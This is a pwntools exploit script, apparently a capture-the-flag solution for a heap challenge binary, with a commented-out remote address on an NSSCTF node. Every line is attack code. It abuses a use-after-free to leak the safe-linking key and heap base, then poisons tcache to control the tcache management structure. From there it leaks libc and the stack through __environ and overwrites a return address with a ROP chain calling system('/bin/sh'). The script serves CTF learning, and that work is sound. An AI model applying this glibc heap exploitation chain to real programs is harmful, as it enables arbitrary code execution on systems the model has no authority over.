from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node4.anna.nssctf.cn",28687)
io=process("./pwn")
elf=ELF("./pwn")
libc=ELF("./libc.so")

def add():
    io.sendlineafter("Choice: ","1") #0x100
    
def delete(n):
    io.sendlineafter("Choice: ","2")
    io.sendlineafter("Idx: \n",str(n))
    
def show(n):
    io.sendlineafter("Choice: ","3")
    io.sendlineafter("Idx: \n",str(n))

def edit(n,s,cc):
    io.sendlineafter("Choice: ","4")
    io.sendlineafter("Idx: \n",str(n))
    io.sendlineafter("Size: \n",str(s))
    io.sendafter("Content: \n",cc)


add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b"\x00"))
print("key: ",hex(key))
heap_addr=key<<12
print("heap_addr: ",hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)
add()#2
add()#3
payload=b"\x00"*0x4e+b"\x07"
edit(3,len(payload),payload)

delete(3)
show(3)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))+0x74a0-libc.sym[b"__malloc_hook"]
print("leak_addr: ",hex(leak_addr))

environ=leak_addr+libc.sym[b"__environ"]
sys_addr=leak_addr+libc.sym[b"system"]
str_sh=leak_addr+next(libc.search(b"/bin/sh"))
pop_rdi=leak_addr+next(libc.search(asm("pop rdi;ret")))
ret=leak_addr+next(libc.search(asm("ret")))

delete(2)
payload=p64(environ^key)+p64(0)
edit(2,len(payload),payload)

payload=b"\x00"*0x1e+b"\x02"
edit(3,len(payload),payload)

add()#4
add()#5
show(5)

stack_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("stack_addr: "+hex(stack_addr))
ret_addr=stack_addr-0x168
print("ret_addr: "+hex(ret_addr))

delete(4)
payload=p64(ret_addr^key)+p64(0)
edit(4,len(payload),payload) 

payload=b"\x00"*0x1e+b"\x02"
edit(3,len(payload),payload)

add()#6
add()#7

gdb.attach(io)
pause()

payload=p64(0)*3+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
edit(7,len(payload),payload)


io.interactive()